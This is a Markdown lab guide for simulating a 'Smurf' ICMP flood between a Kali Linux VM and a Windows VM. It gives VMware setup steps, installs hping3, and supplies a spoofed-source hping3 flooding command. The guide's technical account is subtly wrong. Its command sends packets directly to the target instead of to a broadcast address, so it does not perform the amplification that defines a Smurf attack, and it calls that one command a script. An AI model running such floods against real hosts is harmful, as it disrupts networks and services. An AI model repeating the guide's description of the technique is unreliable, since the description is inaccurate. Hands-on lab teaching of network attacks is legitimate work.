# SMURF ATTACK GUIDE

## Introduction
The Smurf Attack is a type of Distributed Denial of Service (DDoS) attack that exploits the Internet Control Message Protocol (ICMP). It involves flooding a target with ICMP Echo Request (ping) packets, causing the target to become overwhelmed and unresponsive.

## Prerequisites
To successfully simulate a Smurf Attack, you will need:
- VMware Workstation or VMware Player
- A Windows OS virtual machine (target)
- A Kali Linux virtual machine (attacker)

## Network Configuration
1. **VMware Network Settings**:  
   - Set the network adapter for both VMs to use a "Host-only" network or "NAT" depending on your environment to communicate internally without external internet access.
   
2. **Configure IP Addresses**:  
   - Assign static IP addresses to both the Kali Linux and Windows VMs.
   - For example:
     - Windows Target: `192.168.56.101`
     - Kali Attacker: `192.168.56.102`

## Step-by-Step Instructions
### 1. Setting Up the Kali Linux Environment
- Update your package list:
  ```bash
  sudo apt update
  sudo apt upgrade
  ```
- Install necessary tools:
  ```bash
  sudo apt install iputils-ping
  sudo apt install hping3
  ```

### 2. Creating the Smurf Attack Script
- Use the following command to initiate a Smurf Attack from Kali Linux:
  ```bash
  hping3 --icmp -c 1000 -a 192.168.56.101 192.168.56.101
  ```  
  Here, `-c 1000` sends 1000 packets, and `-a` specifies the spoofed IP address which is the target.

### 3. Executing the Attack
- Run the script in the terminal of your Kali Linux VM and observe the behavior on the Windows VM.

## Monitoring Procedures
- On the Windows target, you can use the Task Manager or Resource Monitor to observe system resource utilization.
- You may also use Wireshark to capture and analyze network packets during the attack.

## Conclusion
The Smurf Attack is a powerful demonstration of how network misconfigurations can lead to vulnerabilities. Always ensure to implement security measures to protect against such attacks in a real-world scenario. Be cautious and ethical while conducting such simulations.

---
*This guide should only be used for educational purposes in a controlled environment.*